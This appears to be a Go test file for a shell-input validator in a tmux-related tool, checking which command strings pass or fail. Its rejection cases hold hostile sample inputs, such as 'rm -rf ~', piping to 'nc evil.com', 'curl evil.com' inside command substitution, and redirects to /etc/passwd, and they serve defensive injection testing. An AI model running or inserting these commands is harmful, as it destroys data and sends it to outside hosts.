package shellsafe_test

import (
	"testing"

	"github.com/serverkraken/flow/internal/shellsafe"
)

func TestChainingOK_AcceptsLegitimateBashWords(t *testing.T) {
	t.Parallel()
	cases := []string{
		"less -S",
		`display-popup -E '~/.tmux/plugins/foo/bar.sh worktime'`,
		`run-shell "~/.tmux/plugins/foo/bar.sh"`,
		"set-option -g @bar value",
		"pbcopy",
		"flow worktime today",
		"a.b.c-d_e",
	}
	for _, s := range cases {
		if !shellsafe.ChainingOK(s) {
			t.Errorf("ChainingOK(%q) = false, want true (legitimate value)", s)
		}
	}
}

func TestChainingOK_RejectsChainingMetacharacters(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		s    string
	}{
		{"semicolon", "less; rm -rf ~"},
		{"pipe", "less | nc evil.com 80"},
		{"and-chain", "less && curl evil.com"},
		{"backtick", "less `whoami`"},
		{"newline", "less\ncurl evil.com"},
		{"carriage return", "less\rmalice"},
		{"redirect-in", "less < /etc/passwd"},
		{"redirect-out", "less > /etc/passwd"},
		{"command substitution", "less $(curl evil.com)"},
		{"variable substitution", "less ${HOME}"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if shellsafe.ChainingOK(tc.s) {
				t.Errorf("ChainingOK(%q) = true, want false (dangerous metacharacter)", tc.s)
			}
		})
	}
}

func TestChainingOK_AllowsQuotesAndLoneDollar(t *testing.T) {
	t.Parallel()
	// $ alone (without ( or {) is harmless — used in tmux user options
	// like @my-$ext or in flag names. Single and double quotes are also
	// allowed because callers like the palette wrap quoted args
	// (display-popup -E '…').
	cases := []string{
		"foo $bar",
		"@my-$ext",
		`display-popup -E 'hi'`,
		`echo "hello"`,
	}
	for _, s := range cases {
		if !shellsafe.ChainingOK(s) {
			t.Errorf("ChainingOK(%q) = false, want true (allowed pattern)", s)
		}
	}
}

func TestUnquotedOK_AcceptsViewerCommands(t *testing.T) {
	t.Parallel()
	cases := []string{
		"less -S",
		"pbcopy",
		"cat",
		"hexdump -C",
	}
	for _, s := range cases {
		if !shellsafe.UnquotedOK(s) {
			t.Errorf("UnquotedOK(%q) = false, want true", s)
		}
	}
}

func TestUnquotedOK_RejectsQuotes(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		s    string
	}{
		{"single quote", `less '`},
		{"double quote", `less "`},
		{"matched quotes", `less "evil"`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if shellsafe.UnquotedOK(tc.s) {
				t.Errorf("UnquotedOK(%q) = true, want false (quote escapes bash -c context)", tc.s)
			}
		})
	}
}

func TestUnquotedOK_RejectsEverythingChainingOKRejects(t *testing.T) {
	t.Parallel()
	// UnquotedOK must be at least as strict as ChainingOK.
	cases := []string{
		"less; rm",
		"less | nc",
		"less $(curl evil)",
		"less\nrm",
	}
	for _, s := range cases {
		if shellsafe.UnquotedOK(s) {
			t.Errorf("UnquotedOK(%q) = true, want false (chaining metacharacter)", s)
		}
	}
}
